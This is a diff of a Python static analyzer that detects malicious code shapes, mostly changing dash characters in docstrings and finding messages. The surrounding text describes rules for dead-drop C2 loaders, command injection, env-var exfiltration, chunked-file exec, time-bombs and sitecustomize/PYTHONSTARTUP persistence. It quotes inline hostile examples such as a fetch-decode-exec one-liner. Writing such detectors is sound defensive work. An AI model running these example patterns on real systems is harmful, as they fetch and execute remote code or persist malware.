+                  per-scope - it names an ambiguous co-occurrence for human review, not
                   a proven chain), but no scope's dataflow confirms the decoded value
-                  is EXECUTED by the sink — either no connection is confirmed at all,
+                  is EXECUTED by the sink - either no connection is confirmed at all,
                   or (adversarial-review follow-up) the only confirmed connection is
                   the decoded value reaching a subprocess.* sink as a non-program data
-                  argument to a FIXED, trusted local binary — e.g.
+                  argument to a FIXED, trusted local binary - e.g.
                   `subprocess.run(["logger", "-t", "x", corr_id])` logging a decoded
                   correlation id, or `subprocess.run(["sha256sum", "--check",
                   checksum])` verifying a downloaded artifact's integrity with a
                   decoded checksum. Both are common, legitimate patterns (the
-                  checksum case is a security-POSITIVE integrity check) — WARN-grade,
+                  checksum case is a security-POSITIVE integrity check) - WARN-grade,
                   same "argument injection, not command injection" distinction
                   TT5_ARG_INJECTION already draws for the general case, deliberately
                   reused rather than re-derived (see
                   `_subprocess_taint_is_command_injection`'s docstring).
 
-    Neither list is populated unless the poll-loop gate (`_poll_loop_present`) holds —
+    Neither list is populated unless the poll-loop gate (`_poll_loop_present`) holds -
     a one-shot fetch->decode->exec with no periodicity is not this rule's concern; the
     direct one-shot case is already covered elsewhere in this module (TT5_CMD_INJECTION,
     REMOTE_CODE_LOAD).
 
-    *list_bindings_by_call* (optional, default None — an empty per-call binding map is
+    *list_bindings_by_call* (optional, default None - an empty per-call binding map is
     used when omitted) is `_list_bindings_by_call(tree)`'s result, reused verbatim from
     the caller (never recomputed here) so a subprocess command bound to a local
-    variable (`cmd = ["logger", "-t", "x"]; ...; subprocess.run(cmd + [corr_id])` —
+    variable (`cmd = ["logger", "-t", "x"]; ...; subprocess.run(cmd + [corr_id])` -
     well, more precisely the common `cmd = [...]; subprocess.run(cmd)` single-binding
     idiom `_single_list_bindings_local` resolves) is still recognised as a fixed argv
     list, not treated as an unresolved dynamic command.
 
-    *facts* (B-993): see `_is_remote_fetch_call` — threaded through to the FETCH leg
+    *facts* (B-993): see `_is_remote_fetch_call` - threaded through to the FETCH leg
     (`_fetching_funcnames`, `_poll_loop_present`, `_deaddrop_fetch_tainted_names`) so a
     bare `urlopen`/`urlretrieve` poll (`from urllib.request import ...`) is recognised
     as periodicity + a fetch source, not only the attribute-call spelling. Round 2
     (same ticket) also threads it into the decode leg
     (`_deaddrop_decode_tainted_names`) and this function's own inline-decode check in
-    the sink loop below — both wrap their own `_expr_reads_remote` call over a bare
+    the sink loop below - both wrap their own `_expr_reads_remote` call over a bare
     fetch, so a bare-name fetch call sitting INLINE inside a decode expression (`payload
     = base64.b64decode(urlopen(u).read())`, or the decode nested directly in the exec
     sink's own argument, `exec(base64.b64decode(urlopen(u).read()))`) is now recognised
@@ -3138,7 +3138,7 @@ def _deaddrop_resolver_findings(
             args = list(node.args) + [kw.value for kw in node.keywords]
             # F-159 follow-up: for subprocess.* alone, narrow which of the call's own
             # argument sub-expressions count as a genuine "decoded value IS the
-            # executed thing" hit down to COMMAND position — see
+            # executed thing" hit down to COMMAND position - see
             # _deaddrop_subprocess_command_parts's docstring. eval/exec/os.system/
             # os.popen have no such position (their whole argument IS the code/shell
             # command), so `hit_args` stays the full argument list for those.
@@ -3165,7 +3165,7 @@ def _deaddrop_resolver_findings(
                     (
                         ln,
                         "content polled from a remote source on a timer is decoded and the "
-                        f"decoded value reaches {sink_name}() — dead-drop C2 resolver shape "
+                        f"decoded value reaches {sink_name}() \u2014 dead-drop C2 resolver shape "
                         "(poll -> decode -> exec)",
                     )
                 )
@@ -3180,7 +3180,7 @@ def _deaddrop_resolver_findings(
                     "a periodic network poll, a decode primitive, and an exec sink are "
                     "all present in this file, but no exec sink call is confirmed to "
                     "run the decoded value as its executed command/payload (at most an "
-                    "inert data argument to a fixed program) — possible dead-drop C2 "
+                    "inert data argument to a fixed program) \u2014 possible dead-drop C2 "
                     "resolver composition (ambiguous)",
                 )
             ],
@@ -3265,7 +3265,7 @@ def _is_exec_sink_call(func: ast.AST) -> tuple:
 
 
 def _is_net_out_data_sink(func: ast.AST) -> tuple:
-    """Return (is_data_net_sink, sink_description) — POST/PUT/PATCH/send* sinks."""
+    """Return (is_data_net_sink, sink_description) - POST/PUT/PATCH/send* sinks."""
     if isinstance(func, ast.Attribute):
         base = _attr_base(func.value)
         if func.attr in _NET_OUT_SINK_DATA_ATTRS and base in _NET_OUT_SINK_BASES:
@@ -3276,7 +3276,7 @@ def _is_net_out_data_sink(func: ast.AST) -> tuple:
 
 
 def _is_ssrf_sink_call(func: ast.AST) -> tuple:
-    """Return (is_ssrf_sink, sink_description) — GET/urlopen sinks."""
+    """Return (is_ssrf_sink, sink_description) - GET/urlopen sinks."""
     if isinstance(func, ast.Name) and func.id == "urlopen":
         return True, "urlopen"
     if isinstance(func, ast.Attribute):
@@ -3648,7 +3648,7 @@ def _scope_own_nodes(scope: ast.AST):
         yield n
         for child in ast.iter_child_nodes(n):
             if isinstance(child, _NESTED_SCOPE_NODES):
-                continue  # nested scope — resolved on its own pass
+                continue  # nested scope - resolved on its own pass
             stack.append(child)
 
 
@@ -5594,7 +5594,7 @@ def _subprocess_taint_is_command_injection(
     True  -> shell=True (or a non-literal shell value), OR a non-list first arg
              (string command / tainted program path) that layer 2 cannot clear, OR
              the program element argv[0] is itself tainted.
-    False -> argv-list form with shell not True and a fixed (untainted) program — the
+    False -> argv-list form with shell not True and a fixed (untainted) program - the
              tainted value is only a non-program argument. That is argument injection
              (low risk: metacharacters are literal argv data passed to execve), NOT
              command injection. Regression guard for the B13 false-positive class.
@@ -5606,7 +5606,7 @@ def _subprocess_taint_is_command_injection(
              correct about that) but every real invocation is hardcoded.
 
     The argv list may be inline (`run([prog, arg])`) or bound to a local resolved via
-    ``list_bindings`` (`cmd = [prog, arg]; run(cmd)`) — the dominant real-world form.
+    ``list_bindings`` (`cmd = [prog, arg]; run(cmd)`) - the dominant real-world form.
 
     The keyword-only `tree`/`owner_map`/`parent_scope`/`shadow_cache`/`ext_taint_map`/
     `list_bindings_by_call` args are layer 2's extra context; all optional (default
@@ -5765,14 +5765,14 @@ def _subprocess_taint_is_command_injection(
         ):
             return True  # tainted program name -> arbitrary program execution
         # Accepted §2.5 residual (TT5 configured-executable class), Dave ruling
-        # 2026-09-26: a RETRACTED fix was drafted here — treat an env/CLI-derived
+        # 2026-09-26: a RETRACTED fix was drafted here - treat an env/CLI-derived
         # argv[0] as non-injectable, or as safe once it is joined to a fixed
         # basename (e.g. `Path(os.environ["X_VENV"]) / "bin" / "python"`). It was
         # never landed: `subprocess.run([os.environ["C2_BIN"]])` is the canonical
         # TT5 true positive, and a venv-DIRECTORY override joined to a fixed
         # "bin/python" tail still executes an attacker-controlled interpreter if
         # the directory is attacker-influenced (e.g. an agent steered by prompt
-        # injection sets the variable) — both would clear right alongside the
+        # injection sets the variable) - both would clear right alongside the
         # benign omniverse-cad-to-simready operator-configuration knob
         # (PHYSICAL_AI_SIMREADY_VALIDATE_VENV / --kit-executable / shutil.which)
         # this residual accepts as a disclosed false positive. Trading that real
@@ -5783,9 +5783,9 @@ def _subprocess_taint_is_command_injection(
         #
         # Folded into the SAME residual, Dave ruling 2026-09-26: a wrapper that
         # composes argv from a module-level command table and a same-module
-        # prefix helper — `NODE_PROBES: list[tuple[str, list[str]]] = [...]` at
+        # prefix helper - `NODE_PROBES: list[tuple[str, list[str]]] = [...]` at
         # module scope, `exec_prefix()` returning a prefix list, and
-        # `for name, argv in NODE_PROBES: run(prefix + argv)` — real target:
+        # `for name, argv in NODE_PROBES: run(prefix + argv)` - real target:
         # dynamo-interconnect-check
         # (~/.openclaw/agents/main/agent/codex-home/.tmp/plugins/plugins/nvidia/
         # skills/dynamo-interconnect-check/scripts/check_interconnect.py:121).
@@ -5795,16 +5795,16 @@ def _subprocess_taint_is_command_injection(
         #     for-loop target unmodified before the sink, but missed a plain
         #     reassignment of the loop variable in the loop body, missed a
         #     nested `for`/`with ... as` rebind of the same name, and missed an
-        #     `AugAssign` on a subscript of the same name — three separate
+        #     `AugAssign` on a subscript of the same name - three separate
         #     false-clear bypasses on the identical resolver.
         #   Round 3: once those were patched, the resolver still trusted the
-        #     table/helper's OWN name binding — a same-module `globals()[...]
+        #     table/helper's OWN name binding - a same-module `globals()[...]
         #     = ...`, `setattr(module, ..., ...)`, or `exec(...)` rebind of the
         #     table or helper name before the loop runs cleared right past it
         #     (TT5_CMD_INJECTION false-clear).
         #   Round 4: patched round 3's reflection-word list, but the list
         #     omitted `__globals__` (a plain function attribute, not a frame
-        #     attribute like the already-listed `f_globals`) — so
+        #     attribute like the already-listed `f_globals`) - so
         #     `some_func.__globals__[key] = ...` rebinds the table with zero
         #     reflection-word tokens in sight, and a computed key
         #     (string-concatenated at runtime) defeats the occurrence-count
@@ -5812,13 +5812,13 @@ def _subprocess_taint_is_command_injection(
         #     the source. Corroborating: this same file's
         #     `_CONTAINMENT_UNSAFE_DUNDER_ATTRS` (B-850) already treats
         #     `__globals__`/`__code__`/`__defaults__`/`__kwdefaults__` as
-        #     first-class dangerous reflection primitives elsewhere — round 4
+        #     first-class dangerous reflection primitives elsewhere - round 4
         #     built a fresh word list for the argv0 resolver and independently
         #     omitted it, with zero test coverage on any of the four names.
         # No round fixed the root cause: Python's dynamism means a source-level
         # table or helper binding is never provably fixed without whole-program
         # analysis (every attribute/global/frame-reflection primitive that can
-        # rebind a name, transitively, at any point before the sink runs) — a
+        # rebind a name, transitively, at any point before the sink runs) - a
         # scope this static, single-pass, stdlib-only analyzer does not have and
         # is not taking on. The dynamo-interconnect-check FAIL stays
         # TT5_CMD_INJECTION crit, unresolved rather than falsely cleared;
@@ -5897,10 +5897,10 @@ def _subprocess_call_is_fixed_argv(
     node: ast.Call, list_bindings: dict[str, ast.List | ast.Tuple] | None = None
 ) -> bool:
     """B-132: True when a subprocess.* call's command is a literal argv LIST (inline or a
-    var bound to exactly one list/tuple literal — see _single_list_bindings_local) and
+    var bound to exactly one list/tuple literal - see _single_list_bindings_local) and
     shell is not True. This is a pure SHAPE check, independent of taint: a fixed argv list
     passes its elements to execve as literal argv data, not through a shell, so it cannot
-    be split/re-interpreted the way a concatenated/interpolated command STRING can — much
+    be split/re-interpreted the way a concatenated/interpolated command STRING can - much
     lower risk regardless of whether any element happens to be attacker-influenced.
     Mirrors _subprocess_taint_is_command_injection's list-resolution but without requiring
     a taint set, so it can gate the untainted DANGEROUS_SINK info-sink classification too.
@@ -5957,7 +5957,7 @@ def _file_tainted(source: str, tree: ast.AST) -> set[str]:
 def _is_env_read_value(node: ast.AST) -> bool:
     """True if *node* is a direct env-var read call (os.getenv, os.environ.get, os.environ[...]).
 
-    Does NOT include file reads, network reads, or any other external source — env-var
+    Does NOT include file reads, network reads, or any other external source - env-var
     reads only, so the taint set stays tightly scoped to the ENV_EXFIL_FLOW rule.
     """
     if isinstance(node, ast.Call):
@@ -5965,7 +5965,7 @@ def _is_env_read_value(node: ast.AST) -> bool:
         # os.getenv("X")
         if isinstance(f, ast.Attribute) and f.attr == "getenv" and _attr_base(f.value) == "os":
             return True
-        # os.environ.get("X") — func is Attribute(value=Attribute(value=Name("os"), attr="environ"), attr="get")
+        # os.environ.get("X") - func is Attribute(value=Attribute(value=Name("os"), attr="environ"), attr="get")
         if isinstance(f, ast.Attribute) and f.attr == "get":
             base = f.value
             if (
@@ -6302,7 +6302,7 @@ def _is_agent_config_read_value(node: ast.AST, tainted: set[str]) -> bool:
             # Or a tainted name (propagation).
             if isinstance(f.value, ast.Name) and f.value.id in tainted:
                 return True
-        # open(path) or Path(path).read_text() etc — check if path has agent-config literal.
+        # open(path) or Path(path).read_text() etc - check if path has agent-config literal.
         if isinstance(f, ast.Name) and f.id in _FILE_OPEN_NAMES:
             if node.args and _has_agent_config_path_const(node.args[0]):
                 return True
@@ -7197,7 +7197,7 @@ def _rebound_names_cached(tree: ast.AST) -> "tuple[set, set]":
 
 
 def _path_module_aliases(tree: ast.AST) -> tuple:
-    """`(direct, viaos)` — the names *tree*'s own imports bind to a path module.
+    """`(direct, viaos)` - the names *tree*'s own imports bind to a path module.
 
     B-753. `direct` holds names whose `.join(...)` is a path join (`from os import path`,
     `import posixpath`, `import os.path as p`, each with or without `as`). `viaos` holds
@@ -7259,7 +7259,7 @@ def _path_module_aliases(tree: ast.AST) -> tuple:
 
 
 def _is_path_join_call(node: ast.AST, path_aliases: "set | None" = None) -> bool:
-    """True when *node* is `os.path.join(...)` — a PATH join, not a string join.
+    """True when *node* is `os.path.join(...)` - a PATH join, not a string join.
 
     B-753. `join` is in `_DECODE_ATTRS` because `"".join(parts)` is a real
     content-hiding primitive: assembling a payload from fragments is one of the shapes
@@ -7301,8 +7301,8 @@ def _is_path_join_call(node: ast.AST, path_aliases: "set | None" = None) -> bool
 
 
 def _has_xor_decode(node: ast.AST) -> bool:
-    """F-053: True when the subtree builds a byte/char sequence via XOR — bytes(...^...),
-    bytearray(...^...), or a comprehension containing ^ — the common non-base64
+    """F-053: True when the subtree builds a byte/char sequence via XOR - bytes(...^...),
+    bytearray(...^...), or a comprehension containing ^ - the common non-base64
     obfuscation. A scalar `a ^ b` (bit flags) is NOT flagged: the XOR must sit inside a
     sequence-builder or comprehension, which is the decode shape."""
     for n in ast.walk(node):
@@ -7808,7 +7808,7 @@ def _subtree_calls_decode_composing(node: ast.AST, composing: set[str]) -> bool:
     )
 
 
-# B336: CHUNKED_FILE_EXEC — a locally-defined helper reads and joins MULTIPLE chunked/
+# B336: CHUNKED_FILE_EXEC - a locally-defined helper reads and joins MULTIPLE chunked/
 # part files (e.g. `_load.part1.txt`, `.part2.txt`, `.part3.txt`) at runtime, and the
 # assembled result is passed to exec()/eval() -- the "split-by-file" scanner-evasion
 # loader shape (a payload that never exists whole in any single shipped .py file).
@@ -8198,14 +8198,14 @@ def _chunked_file_exec_findings(tree: ast.AST) -> list:
             (
                 getattr(node, "lineno", 0),
                 f"exec()/eval() executes content assembled by reading {len(fed_paths)} "
-                f"chunked files ({', '.join(fed_paths[:3])}{extra}) — split-by-file "
+                f"chunked files ({', '.join(fed_paths[:3])}{extra}) \u2014 split-by-file "
                 "payload-loader shape",
             )
         )
     return found
 
 
-# F-058: code-level time-bomb / sandbox-evasion. Narrow on purpose — wall-clock date
+# F-058: code-level time-bomb / sandbox-evasion. Narrow on purpose - wall-clock date
 # (datetime.now()/date.today()/utcnow) and environment presence (os.environ / os.getenv)
 # only; NOT time.time() elapsed-timeouts or sys.platform checks, which are ordinary flow.
 _TIMEBOMB_DATE_HINTS = {"now", "today", "utcnow", "fromtimestamp", "datetime", "date"}
@@ -8301,7 +8301,7 @@ def _shell_injection_risk_findings(tree: ast.AST) -> list:
                     "SHELL_INJECTION_RISK",
                     "info",
                     getattr(node, "lineno", 0),
-                    f"{exec_name}() runs a non-literal command through a shell — "
+                    f"{exec_name}() runs a non-literal command through a shell \u2014 "
                     "shell-injection-prone shape",
                 )
             )
@@ -8335,7 +8335,7 @@ def _shell_injection_risk_findings(tree: ast.AST) -> list:
                 "SHELL_INJECTION_RISK",
                 "info",
                 getattr(node, "lineno", 0),
-                f"{exec_name}() runs a non-literal command ({shape}) — "
+                f"{exec_name}() runs a non-literal command ({shape}) \u2014 "
                 "shell-injection-prone shape",
             )
         )
@@ -8344,7 +8344,7 @@ def _shell_injection_risk_findings(tree: ast.AST) -> list:
 
 def _conditional_sink_findings(tree: ast.AST) -> list:
     """A dangerous sink (exec/eval/os.system/subprocess or a network call) reachable only
-    under a date/time or environment guard — the code-level time-bomb / sandbox-evasion
+    under a date/time or environment guard - the code-level time-bomb / sandbox-evasion
     pattern, distinct from B65's prose sleeper-trigger. WARN-grade (conditional execution
     has legit uses): the checks engine routes CONDITIONAL_SINK to a WARN, never an automatic FAIL."""
     out = []
@@ -8368,7 +8368,7 @@ def _conditional_sink_findings(tree: ast.AST) -> list:
                                 "info",
                                 ln,
                                 f"a dangerous sink ({sink or 'network call'}) runs only under {kind} "
-                                "condition — possible time-bomb / sandbox-evasion gating",
+                                "condition \u2014 possible time-bomb / sandbox-evasion gating",
                             )
                         )
                         found = True
@@ -8385,22 +8385,22 @@ def _names_in(node: ast.AST) -> set[str]:
 def _global_declared_names(fn: ast.AST, owner_map: dict) -> set[str]:
     """B-205 (C-135 finding 1) + B-209 (C-135 follow-up): names declared `global`
     within `fn`'s OWN scope. An assignment to one of these names writes to MODULE
-    scope regardless of which function syntactically contains it — Python's actual
-    `global` semantics — so it must be bucketed as module-level taint (visible
+    scope regardless of which function syntactically contains it - Python's actual
+    `global` semantics - so it must be bucketed as module-level taint (visible
     everywhere), not scoped to the syntactically-nearest owning function. Without
     this, `global secret; secret = base64.b64decode(...)` in one function followed by
     `exec(secret)` in a DIFFERENT function silently stopped firing once per-function
-    scoping landed — a real detection-bypass regression, not just a missed edge case.
+    scoping landed - a real detection-bypass regression, not just a missed edge case.
 
     B-209: a raw `ast.walk(fn)` over `fn`'s ENTIRE subtree (the original B-205 shape)
-    also picks up a `global X` declared inside a NESTED function within `fn` —
+    also picks up a `global X` declared inside a NESTED function within `fn` -
     wrongly promoting `fn`'s OWN separate, non-global local `X` to the module-wide
     bucket too, since both share the same bare name. Filtering by `owner_map` (B-210's
     per-nested-function scoping) restricts this to `global` statements owner_map
     itself attributes to `fn` directly; a `global` inside a deeper nested function
     belongs to THAT function's own scope and is resolved on its own pass when
     `_tainted_names` reaches it. See `_nonlocal_declared_names` for the sibling
-    `nonlocal` case (C-135 on B-210) — deliberately NOT folded in here, since
+    `nonlocal` case (C-135 on B-210) - deliberately NOT folded in here, since
     `nonlocal` needs different bucketing (see that function's docstring)."""
     return {
         n2
@@ -8411,14 +8411,14 @@ def _global_declared_names(fn: ast.AST, owner_map: dict) -> set[str]:
 
 
 def _nonlocal_declared_names(fn: ast.AST, owner_map: dict) -> set[str]:
-    """C-135 (on B-210): names declared `nonlocal` within `fn`'s OWN scope — same
+    """C-135 (on B-210): names declared `nonlocal` within `fn`'s OWN scope - same
     owner_map-filtered shape as `_global_declared_names`, but kept SEPARATE because
     `nonlocal` needs different bucketing in `_tainted_names`, not the same None/
     module-wide bucket `global` uses.
 
     `nonlocal X` rebinds SOME ENCLOSING function's own EXISTING local `X` (the
-    nearest ancestor scope that itself binds `X` — required by Python's own syntax
-    rules, so at least one exists) — not module scope. B-210's new per-nested-
+    nearest ancestor scope that itself binds `X` - required by Python's own syntax
+    rules, so at least one exists) - not module scope. B-210's new per-nested-
     function scope buckets made this a real evasion: a helper nested inside `outer`
     doing `nonlocal payload; payload = base64.b64decode(...)`, read back and exec'd
     in `outer` right after, is genuine runtime taint flow (the write truly lands in
@@ -8426,10 +8426,10 @@ def _nonlocal_declared_names(fn: ast.AST, owner_map: dict) -> set[str]:
     got their own bucket. Routing it through the None bucket like `global` (tried
     first, C-135 caught it) does NOT work: `_tainted_names_visible`'s shadow
     subtraction treats a scope's OWN local binding of the same name as blocking
-    outer/module visibility — correct for `global` (a genuinely separate namespace,
+    outer/module visibility - correct for `global` (a genuinely separate namespace,
     so an unrelated same-named local really does shadow it) but wrong for
     `nonlocal`, whose "outer" binding IS, by construction, that ancestor's own
-    local — the exact thing shadow-subtraction was designed to protect, not defeat.
+    local - the exact thing shadow-subtraction was designed to protect, not defeat.
     `_tainted_names` therefore seeds the tainted name directly into the ancestor
     bucket(s) `_nonlocal_target_scopes` resolves, bypassing the chain-walk's shadow
     subtraction entirely.
@@ -8441,7 +8441,7 @@ def _nonlocal_declared_names(fn: ast.AST, owner_map: dict) -> set[str]:
     evaluated and rejected ONCE BEFORE, correctly: paired with the then whole-subtree
     shadow walk it made an INTERMEDIATE ancestor that merely READS the name lose
     visibility of it, trading the false positive for a worse false negative. That
-    blocker was the subtree walk, not the refinement — with `_own_bound_names` now
+    blocker was the subtree walk, not the refinement - with `_own_bound_names` now
     stopping at nested-function boundaries (B-214), a nested write no longer counts
     as an intermediate ancestor's own shadowing binding, so the precise resolution
     is finally sound. Both halves had to land together."""
@@ -8463,7 +8463,7 @@ def _nonlocal_target_scopes(
 ) -> list:
     """B-215: the ancestor scope(s) a `nonlocal name` write inside `scope` actually
     lands in. Python binds it to the NEAREST enclosing function scope with its own
-    binding for `name` — so a grandparent further out that merely reuses the same bare
+    binding for `name` - so a grandparent further out that merely reuses the same bare
     name for an unrelated local of its own is NOT written to and must not be seeded.
 
     An intermediate ancestor that itself declares `name` nonlocal is not the target
@@ -8498,7 +8498,7 @@ def _tainted_names(
     parent_scope: dict | None = None,
     shadow_cache: dict | None = None,
 ) -> dict:
-    """Names assigned from a decode/decompress expression — so a dynamic-eval call on
+    """Names assigned from a decode/decompress expression - so a dynamic-eval call on
     `payload`, where `payload` was assigned `base64.b64decode(...)` earlier, is still
     recognised. `composing` (from _decode_composing_funcnames) extends this to an
     assignment from a call to a decode-composing wrapper, e.g. `payload = _decode(blob)`
@@ -8509,16 +8509,16 @@ def _tainted_names(
 
     B-205: returns a dict keyed by the owning scope node (a function at any nesting
     depth, a top-level class's own method, or None for module-level/`global`-declared
-    assignments), NOT a flat set — a previous flat-set version let an unrelated
+    assignments), NOT a flat set - a previous flat-set version let an unrelated
     same-named local in a DIFFERENT function collide (the same class of bug
     C-202/C-135 rounds 1+3 found and fixed for decode-composing FUNCTION names, left
     open here for this function's own inline-decode base case). A `global`-declared
     target always buckets to None regardless of its syntactic scope (C-135 finding 1
-    — real `global` semantics, not the syntactic nesting owner_map otherwise uses;
+    - real `global` semantics, not the syntactic nesting owner_map otherwise uses;
     B-209: scoped to the assignment's OWN immediate function, not any top-level
-    ancestor — see `_global_declared_names`). A `nonlocal`-declared target is instead
+    ancestor - see `_global_declared_names`). A `nonlocal`-declared target is instead
     seeded directly into the bucket of the ancestor scope Python would really rebind
-    (B-215 — see `_nonlocal_declared_names` / `_nonlocal_target_scopes`).
+    (B-215 - see `_nonlocal_declared_names` / `_nonlocal_target_scopes`).
     Use `_tainted_names_visible()` to resolve the subset actually visible at a call
     site's own scope, including via a genuine closure read of an enclosing scope's
     own tainted local (B-210)."""
@@ -8576,28 +8576,28 @@ def _tainted_names_visible(
     shadow_cache: dict,
     global_cache: dict | None = None,
 ) -> set[str]:
-    """B-205: the tainted-name set visible at `node`'s position — names tainted by a
+    """B-205: the tainted-name set visible at `node`'s position - names tainted by a
     module-level decode assignment, by node's own scope, or by any ENCLOSING scope
-    along node's real lexical nesting chain (B-210 — a nested function still sees a
+    along node's real lexical nesting chain (B-210 - a nested function still sees a
     genuine closure read of an outer function's own tainted local, not just its own
     bucket and the module-level one, mirroring `_decode_composing_visible`'s scoping
     model). B-211: an ancestor scope's tainted name only counts if nothing BETWEEN
     node and that ancestor locally shadows the same name (a module-level tainted name
     shadowed by a same-named function parameter or local reassignment no longer false
-    fires — previously missing here even though `_decode_composing_visible` already
+    fires - previously missing here even though `_decode_composing_visible` already
     did the analogous subtraction). Shadow is accumulated scope-by-scope walking
     OUTWARD (checking each ancestor's bucket BEFORE merging that ancestor's own
     shadow set into the running total) so a scope's own tainted assignment is never
-    checked against its OWN shadow set — which would incorrectly treat a taint
+    checked against its OWN shadow set - which would incorrectly treat a taint
     source as shadowing itself and silently drop a real closure read.
 
     B-261: a name `scope` declares `global` is not resolved by that outward walk at
-    all — Python jumps straight to the module binding. Modelling it as a walk (which
+    all - Python jumps straight to the module binding. Modelling it as a walk (which
     the first attempt at B-261 effectively did, by dropping the name from `scope`'s
     own shadow set and letting the ordinary chain walk proceed) reads every ENCLOSING
     FUNCTION's same-named local on the way out and produced a real false-positive
     FAIL. So the redirect is applied as a redirect: the name is shadowed for the whole
-    chain, then taken from the module bucket directly. `nonlocal` needs nothing here —
+    chain, then taken from the module bucket directly. `nonlocal` needs nothing here -
     it resolves to an ancestor that, by Python's own syntax rules, binds the name and
     therefore ends the walk itself (see `_own_bound_names`).
 
@@ -8630,7 +8630,7 @@ def _tainted_names_visible(
         return shadow_cache[s]
 
     # Names `scope` declares `global` in its OWN body (owner_map-filtered, so a
-    # declaration inside a nested function is not attributed here — B-209).
+    # declaration inside a nested function is not attributed here - B-209).
     if global_cache is None:
         global_here = _global_declared_names(scope, owner_map)
     else:
@@ -8652,7 +8652,7 @@ def _tainted_names_visible(
         cumulative_shadow |= get_shadow(ancestor)
         ancestor = parent_scope.get(ancestor)
     # The redirect itself: a `global`-declared name IS the module binding, so it is
-    # visible whenever that binding is tainted — no accumulated shadow can hide it.
+    # visible whenever that binding is tainted - no accumulated shadow can hide it.
     if global_here:
         visible |= set(tainted.get(None, ())) & global_here
     return visible
@@ -8690,7 +8690,7 @@ def _is_sys_path_mutation(call: ast.Call) -> ast.AST | None:
 
 
 def _is_writable_import_path(node: ast.AST) -> bool:
-    """True if a sys.path entry is attacker-influenceable — a relative or world-writable
+    """True if a sys.path entry is attacker-influenceable - a relative or world-writable
     string literal, or a value derived from an environment variable. The benign self-dir
     form (anchored on __file__) is NOT flagged here: install-directory writability is a
     separate defensibility signal, not an import-path hijack via an untrusted location.
@@ -11504,22 +11504,22 @@ def _has_uncovered_inline_source(
 
 
 # F-177/B375: sitecustomize.py/usercustomize.py + PYTHONSTARTUP auto-execution
-# persistence INSTALL, resolved at AST function-scope precision — the persistence-
+# persistence INSTALL, resolved at AST function-scope precision - the persistence-
 # axis-feeding twin of checks/_content.py's check_python_runtime_persist_install
 # (B335), which already recognizes this exact shape via a whole-file regex + a
 # character-proximity window but carries no AST0x rule of its own (see catalog.py's
 # B375 comment and dossier.py's _AXIS_BY_ID for why that matters).
 #
-# Mechanism A: within ONE function — a site.getsitepackages()/getusersitepackages()
+# Mechanism A: within ONE function - a site.getsitepackages()/getusersitepackages()
 # call, a sitecustomize.py/usercustomize.py string constant (the install TARGET), and
 # a write/append-mode open() call.
-# Mechanism B: within ONE function — a shell-rc path string constant (.bashrc/.zshrc/
+# Mechanism B: within ONE function - a shell-rc path string constant (.bashrc/.zshrc/
 # .bash_profile/.profile/.zprofile), a PYTHONSTARTUP=-shaped string constant (an
-# assignment, never a bare mention — the same discriminator B335 uses), and a
+# assignment, never a bare mention - the same discriminator B335 uses), and a
 # write/append-mode open() call.
 #
 # "Same function scope" (ast.walk(fn), not the whole file) is the deliberate boundary
-# — the same co-occurrence precision as `_function_has_history_file_read` above — so a
+# - the same co-occurrence precision as `_function_has_history_file_read` above - so a
 # skill that merely INTROSPECTS site.getsitepackages() in one function while an
 # unrelated function elsewhere in the same file happens to open() some other,
 # unrelated file for writing does not convict. Dev tooling / venv doctors are exactly
@@ -11532,7 +11532,7 @@ _AST_PYTHONSTARTUP_ASSIGN_RE = re.compile(r"PYTHONSTARTUP[\"']?\]?\s*=")
 
 
 def _is_write_or_append_open_call(node: ast.AST) -> bool:
-    """True for `open(path, "w"/"wb"/"a"/"ab")` (positional or `mode=` keyword) — the
+    """True for `open(path, "w"/"wb"/"a"/"ab")` (positional or `mode=` keyword) - the
     AST twin of checks/_content.py's `_WRITE_MODE_OPEN_RE` (same `[wa]b?` shape, so a
     read-only open() or an unrecognized mode like "w+"/"x" never matches either)."""
     if not isinstance(node, ast.Call) or not _is_open_call(node):
@@ -11548,7 +11548,7 @@ def _is_write_or_append_open_call(node: ast.AST) -> bool:
 
 def _is_sitepackages_lookup_call(node: ast.AST) -> bool:
     """True for a call to `getsitepackages()`/`getusersitepackages()` under any base
-    name — the AST match works on the attribute/name alone and needs no literal
+    name - the AST match works on the attribute/name alone and needs no literal
     `site.` prefix text the way a regex would."""
     if not isinstance(node, ast.Call):
         return False
@@ -11570,7 +11570,7 @@ def _bare_string_stmt_constant_ids(fn: ast.AST) -> set:
     that merely MENTIONS a filename is not the same as USING it as a real value: a
     functioning install always needs the filename to appear inside an expression
     actually in use (an assignment RHS, a call argument, an f-string), never merely
-    as an orphaned bare string statement — so excluding these loses no true
+    as an orphaned bare string statement - so excluding these loses no true
     positive."""
     ids: set = set()
     for node in ast.walk(fn):
@@ -11584,7 +11584,7 @@ def _bare_string_stmt_constant_ids(fn: ast.AST) -> set:
 
 
 def _function_has_sitecustomize_install(fn: ast.AST) -> bool:
-    """Mechanism A (F-177/B375) — see the module comment above
+    """Mechanism A (F-177/B375) - see the module comment above
     `_AST_SITECUSTOMIZE_TARGET_RE` for the full co-occurrence rationale."""
     nodes = list(ast.walk(fn))
     prose_ids = _bare_string_stmt_constant_ids(fn)
@@ -11602,7 +11602,7 @@ def _function_has_sitecustomize_install(fn: ast.AST) -> bool:
 
 
 def _function_has_pythonstartup_shell_rc_install(fn: ast.AST) -> bool:
-    """Mechanism B (F-177/B375) — see the module comment above
+    """Mechanism B (F-177/B375) - see the module comment above
     `_AST_SHELL_RC_TARGET_RE` for the full co-occurrence rationale."""
     nodes = list(ast.walk(fn))
     prose_ids = _bare_string_stmt_constant_ids(fn)
@@ -11629,7 +11629,7 @@ def _persist_install_function_findings(tree: ast.AST) -> list[tuple[int, str, st
     """Scan every function scope in *tree* for mechanism A or B (F-177/B375).
 
     Returns (lineno, mechanism, funcname) for each function whose OWN scope trips
-    either mechanism — mirrors `_telemetry_collector_funcnames`'s per-function walk
+    either mechanism - mirrors `_telemetry_collector_funcnames`'s per-function walk
     above. A function that somehow trips both mechanisms reports only A (mechanism
     identity is informational evidence text, not a distinct verdict)."""
     hits: list[tuple[int, str, str]] = []
@@ -11643,7 +11643,7 @@ def _persist_install_function_findings(tree: ast.AST) -> list[tuple[int, str, st
     return hits
 
 
-# ── B-917: loader sinks (runpy/importlib/zipimport execute a FILE by
+# -- B-917: loader sinks (runpy/importlib/zipimport execute a FILE by
 # PATH, not a name reference) and staged-import correlation (a write followed by an
 # import whose search path resolves to the same location). Both reuse shippedexec's
 # shared location resolver (`_FileFacts.locate()` / `loc_eq()` -- see shippedexec.py's
